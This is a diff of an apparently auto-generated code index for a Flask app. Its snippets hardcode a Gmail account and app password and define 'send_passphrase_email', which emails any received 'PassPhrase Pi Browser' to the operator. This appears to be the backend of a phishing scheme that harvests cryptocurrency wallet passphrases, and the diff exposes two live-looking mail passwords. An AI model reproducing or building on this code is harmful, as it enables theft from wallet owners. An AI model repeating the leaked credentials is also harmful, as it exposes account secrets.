@@ -106,7 +106,7 @@
         "kind": 5,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "app = Flask(__name__)\napp.config['MAIL_SERVER'] = 'smtp.gmail.com'\napp.config['MAIL_PORT'] = 465\napp.config['MAIL_USE_SSL'] = True\napp.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"",
+        "peekOfCode": "app = Flask(__name__)\napp.config['MAIL_SERVER'] = 'smtp.gmail.com'\napp.config['MAIL_PORT'] = 465\napp.config['MAIL_USE_SSL'] = True\napp.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'fhor jhck gonx mucm'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"",
         "detail": "app",
         "documentation": {}
     },
@@ -115,7 +115,7 @@
         "kind": 5,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "app.config['MAIL_SERVER'] = 'smtp.gmail.com'\napp.config['MAIL_PORT'] = 465\napp.config['MAIL_USE_SSL'] = True\napp.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.",
+        "peekOfCode": "app.config['MAIL_SERVER'] = 'smtp.gmail.com'\napp.config['MAIL_PORT'] = 465\napp.config['MAIL_USE_SSL'] = True\napp.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'fhor jhck gonx mucm'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.",
         "detail": "app",
         "documentation": {}
     },
@@ -124,7 +124,7 @@
         "kind": 5,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "app.config['MAIL_PORT'] = 465\napp.config['MAIL_USE_SSL'] = True\napp.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"",
+        "peekOfCode": "app.config['MAIL_PORT'] = 465\napp.config['MAIL_USE_SSL'] = True\napp.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'fhor jhck gonx mucm'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"",
         "detail": "app",
         "documentation": {}
     },
@@ -133,7 +133,7 @@
         "kind": 5,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "app.config['MAIL_USE_SSL'] = True\napp.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:",
+        "peekOfCode": "app.config['MAIL_USE_SSL'] = True\napp.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'fhor jhck gonx mucm'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:",
         "detail": "app",
         "documentation": {}
     },
@@ -142,7 +142,7 @@
         "kind": 5,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "app.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(",
+        "peekOfCode": "app.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'\napp.config['MAIL_PASSWORD'] = 'fhor jhck gonx mucm'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(",
         "detail": "app",
         "documentation": {}
     },
@@ -151,7 +151,7 @@
         "kind": 5,
         "importPath": "app",
         "description": "app",
-        "peekOfCode": "app.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(\n            subject=\"📪 Nouveau PassPhrase Pi Browser reçu!\",",
+        "peekOfCode": "app.config['MAIL_PASSWORD'] = 'fhor jhck gonx mucm'\napp.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'\nmail = Mail(app)\ndef send_passphrase_email(passphrase):\n    \"\"\"\n    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.\n    \"\"\"\n    try:\n        msg = Message(\n            subject=\"📪 Nouveau PassPhrase Pi Browser reçu!\",",
         "detail": "app",
         "documentation": {}
     },
